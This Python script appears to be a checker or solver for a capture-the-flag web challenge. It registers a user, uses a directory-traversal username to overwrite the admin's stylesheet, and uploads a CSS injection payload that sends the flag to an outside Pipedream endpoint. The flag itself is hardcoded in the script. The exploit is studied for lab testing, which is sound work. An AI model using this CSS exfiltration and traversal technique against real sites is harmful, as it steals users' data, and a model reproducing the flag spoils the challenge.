import random
import time
from io import StringIO
from string import ascii_lowercase, ascii_uppercase, digits
from urllib.parse import urljoin

import requests

PIPEDREAM_ENDPOINT = ""
PIPEDREAM_SOURCE_ID = ""
PIPEDREAM_API_KEY = ""
PIPEDREAM_API_ENDPOINT = (
    f"https://api.pipedream.com/v1/sources/{PIPEDREAM_SOURCE_ID}/event_summaries"
)


def check_web_styled_memo(host_name):
    if "http" not in host_name:
        host_name = "https://" + host_name

    chars = ascii_lowercase + ascii_uppercase + digits

    s = requests.session()

    username = "".join(random.sample(chars, 8))

    # ユーザ登録
    url = urljoin(host_name, "register")

    try:
        r = s.get(url, timeout=3)
        r.raise_for_status()
    except Exception:
        return 2

    try:
        r = s.post(
            url,
            data={"username": username, "password1": "hoge", "password2": "hoge"},
            headers={"referer": url, "X-CSRFToken": s.cookies.get("csrftoken")},
            timeout=3,
        )
        r.raise_for_status()

        # adminのusername取得
        admin_username = r.text[
            r.text.find("username: ")
            + len("username: ") : r.text.find("がFLAGを持っているようです。")
        ]

        chars += "{}_-@"

        flag = "FLAG{CSS_Injecti0n_us1ng_d1r3ctory_tr@versal}"
        # css injection のためのcssを作成
        rnd = "".join(random.sample(chars, 8))
        css = f'.btn-memo-detail[data-content^="{flag}"]{{background:url({PIPEDREAM_ENDPOINT}/?flag={flag}{rnd})}}'

        # usernameを変更し、cssをupload
        url = urljoin(host_name, "user")
        r = s.post(
            url,
            data={"username": f"./{admin_username}"},
            files={"css": ("example.css", StringIO(css))},
            headers={"referer": url, "X-CSRFToken": s.cookies.get("csrftoken")},
            timeout=3,
        )
        r.raise_for_status()

        # adminに確認してもらう
        r = s.get(urljoin(host_name, "crawl"), timeout=3)
        r.raise_for_status()

        for _ in range(5):
            time.sleep(1)
            # pipedream apiで確認
            r = requests.get(
                PIPEDREAM_API_ENDPOINT,
                headers={"Authorization": f"Bearer {PIPEDREAM_API_KEY}"},
                timeout=3,
            )
            r.raise_for_status()

            if flag + rnd == r.json()["data"][0]["event"]["query"]["flag"]:
                return 0
        return 1
    except:
        return 1


if __name__ == "__main__":
    print(check_web_styled_memo("http://localhost"))
